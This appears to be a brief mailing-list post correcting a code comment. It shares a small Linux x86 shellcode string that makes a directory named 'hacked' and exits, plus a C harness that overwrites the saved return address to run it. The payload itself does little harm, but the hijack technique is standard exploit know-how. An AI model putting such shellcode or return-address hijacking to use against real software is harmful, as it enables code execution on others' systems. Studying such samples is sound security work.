The comment in that file is not correct.. I cut and pasted the shell code
in an existing c source and forgot to adjust it..

/*
 * This shellcode will do a mkdir() of 'hacked' and then an exit()
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        "\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed"
        "\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68"
        "\x61\x63\x6b\x65\x64\x23";


void main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}